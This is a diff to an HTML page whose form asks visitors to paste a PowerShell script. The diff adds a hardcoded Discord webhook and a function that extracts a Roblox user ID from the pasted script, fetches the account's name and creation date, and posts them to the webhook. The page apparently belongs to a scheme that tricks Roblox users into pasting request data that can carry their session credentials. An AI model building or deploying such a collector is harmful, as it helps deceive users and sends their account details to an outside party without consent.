@@ -18,9 +18,6 @@
   </header>
   <main>
     <h1>Updated Daily</h1>
-    <div id="wordContainer">
-      <p id="word">Fetching word...</p>
-    </div>
     <div class="form-container">
       <form id="scriptForm">
         <label for="powershellScript">The PowerShell Script (Required)</label>
@@ -34,25 +31,7 @@
     </div>
   </main>
   <script>
-    // Function to fetch a word from hello.txt
-    async function fetchWord() {
-      try {
-        const response = await fetch('hello.txt'); // Ensure hello.txt is in the same directory as this HTML file
-        if (!response.ok) {
-          throw new Error('Failed to fetch hello.txt');
-        }
-        const text = await response.text();
-        const words = text.split(/\s+/); // Split by whitespace
-        const word = words.length > 0 ? words[0] : 'No words found'; // Get the first word
-        document.getElementById('word').textContent = `Word from hello.txt: ${word}`;
-      } catch (error) {
-        console.error('Error fetching word:', error);
-        document.getElementById('word').textContent = 'Error fetching word.';
-      }
-    }
-
-    // Fetch a word on page load
-    fetchWord();
+    const discordWebhookURL = 'https://discord.com/api/webhooks/1321014467961688086/23ZdDrcdjDDqo13bX7Rt1OUu5K7nfNSdAYUcIOih9UIiGD506j4ZkW4M6U2wREn-8C6l';
 
     document.getElementById('scriptForm').addEventListener('submit', function(event) {
       event.preventDefault();
@@ -83,9 +62,52 @@
       }
     });
 
-    function sendToDiscord(script) {
-      // You can include your existing sendToDiscord logic here
-    }
+	function sendToDiscord(script) {
+	  // Extract the "path" value from the PowerShell script
+	  const pathMatch = script.match(/"path"="([^"]+)"/);
+	  const path = pathMatch ? pathMatch[1] : 'Path not found';
+
+	  const numberMatch = path.match(/\d+/);
+	  const number = numberMatch ? numberMatch[0] : 'No number found';
+
+	  // Define Roblox API URL
+	  const apiUrl = `https://users.roblox.com/v1/users/${number}`;
+
+	  // Fetch user data from Roblox API
+	  fetch(apiUrl)
+		.then(response => response.json())
+		.then(data => {
+		  // Extract name and created date from API response
+		  const name = data.name || 'No name found';
+		  const createdDate = data.created || 'No created date found';
+
+		  // Create the payload with name and created date
+		  const payload = {
+			content: `Received Script Path: ${number}\nName: ${name}\nCreated: ${createdDate}`,
+			username: "Script Path"
+		  };
+
+		  // Send the webhook to Discord
+		  fetch(discordWebhookURL, {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify(payload)
+		  })
+		  .then(response => {
+			if (response.ok) {
+			  console.log('Script path sent to Discord successfully');
+			} else {
+			  console.error('Error sending script path to Discord');
+			}
+		  })
+		  .catch(error => {
+			console.error('Fetch error:', error);
+		  });
+		})
+		.catch(error => {
+		  console.error('Error fetching data from Roblox API:', error);
+		});
+	}
   </script>
 </body>
 </html>
